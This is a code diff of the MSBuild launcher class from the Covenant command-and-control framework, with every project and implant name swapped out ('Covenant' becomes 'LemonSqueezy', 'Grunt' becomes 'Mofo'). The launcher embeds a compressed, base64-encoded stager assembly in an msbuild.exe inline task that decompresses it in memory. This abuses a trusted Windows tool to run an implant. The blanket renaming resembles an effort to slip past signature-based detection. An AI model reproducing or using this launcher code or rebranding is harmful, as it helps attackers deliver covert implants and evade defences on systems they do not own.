@@ -1,15 +1,15 @@
 ﻿// Author: Ryan Cobb (@cobbr_io)
-// Project: Covenant (https://github.com/cobbr/Covenant)
+// Project: LemonSqueezy (https://github.com/cobbr/LemonSqueezy)
 // License: GNU GPLv3
 
 using System;
 using System.Linq;
 using Microsoft.CodeAnalysis;
 
-using Covenant.Models.Grunts;
-using Covenant.Models.Listeners;
+using LemonSqueezy.Models.Mofos;
+using LemonSqueezy.Models.Listeners;
 
-namespace Covenant.Models.Launchers
+namespace LemonSqueezy.Models.Launchers
 {
     public class MSBuildLauncher : DiskLauncher
     {
@@ -20,16 +20,16 @@ namespace Covenant.Models.Launchers
         {
             this.Name = "MSBuild";
             this.Type = LauncherType.MSBuild;
-            this.Description = "Uses msbuild.exe to launch a Grunt using an in-line task.";
+            this.Description = "Uses msbuild.exe to launch a Mofo using an in-line task.";
             this.OutputKind = OutputKind.WindowsApplication;
             this.CompressStager = true;
         }
 
-        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
+        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Mofo mofo, ImplantTemplate template)
         {
             this.StagerCode = StagerCode;
             this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
-            this.DiskCode = XMLTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
+            this.DiskCode = XMLTemplate.Replace("{{MOFO_IL_BYTE_STRING}}", this.Base64ILByteString);
             this.DiskCode = DiskCode.Replace("{{TARGET_NAME}}", this.TargetName);
             this.DiskCode = DiskCode.Replace("{{TASK_NAME}}", this.TaskName);
 
@@ -62,7 +62,7 @@ namespace Covenant.Models.Launchers
       <Code Type=""Fragment"" Language=""cs"">
         <![CDATA[
             var oms = new System.IO.MemoryStream();
-            var ds = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(""{{GRUNT_IL_BYTE_STRING}}"")), System.IO.Compression.CompressionMode.Decompress);
+            var ds = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(""{{MOFO_IL_BYTE_STRING}}"")), System.IO.Compression.CompressionMode.Decompress);
             var by = new byte[1024];
             var r = ds.Read(by, 0, 1024);
             while (r > 0)
